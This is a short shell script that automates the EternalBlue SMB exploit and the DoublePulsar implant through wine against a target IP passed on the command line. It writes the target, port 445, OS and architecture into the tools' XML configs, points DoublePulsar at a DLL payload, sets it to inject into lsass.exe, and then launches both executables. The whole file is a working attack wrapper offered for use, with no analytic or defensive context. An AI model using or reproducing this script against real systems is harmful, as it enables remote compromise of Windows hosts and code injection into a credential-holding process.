#/bin/sh

#usage ./eternalblue.sh <target_ip>

target="$1"
ebpath='/usr/share/metasploit-framework/data/doublepulsar'
dopupath='/usr/share/metasploit-framework/data/doublepulsar'
winepath='c:\\shellcode\\'
dllname='launcher.dll'
process='lsass.exe'

cd $ebpath
cp Eternalblue-2.2.0.Skeleton.xml Eternalblue-2.2.0.xml
sed -i "s/%RHOST%/$target/" Eternalblue-2.2.0.xml
sed -i 's/%RPORT%/445/' Eternalblue-2.2.0.xml
sed -i 's/%TIMEOUT%/60/' Eternalblue-2.2.0.xml
sed -i 's/%TARGET%/WIN72K8R2/' Eternalblue-2.2.0.xml

cd $dopupath
cp Doublepulsar-1.3.1.Skeleton.xml Doublepulsar-1.3.1.xml
sed -i "s/%RHOST%/$target/" Doublepulsar-1.3.1.xml
sed -i 's/%RPORT%/445/' Doublepulsar-1.3.1.xml
sed -i 's/%TIMEOUT%/60/' Doublepulsar-1.3.1.xml
sed -i 's/%TARGETARCHITECTURE%/x64/' Doublepulsar-1.3.1.xml
dllpayload="$winepath$dllname"
echo "$dllpayload"
#dllpayload=`echo $dllpayload | sed -e 's/\//\\\// -'`
sed -i "s/%DLLPAY%/$dllpayload/" Doublepulsar-1.3.1.xml
sed -i "s/%PROCESSINJECT%/$process/" Doublepulsar-1.3.1.xml

cd $ebpath
wine Eternalblue-2.2.0.exe

cd $dopupath
wine Doublepulsar-1.3.1.exe


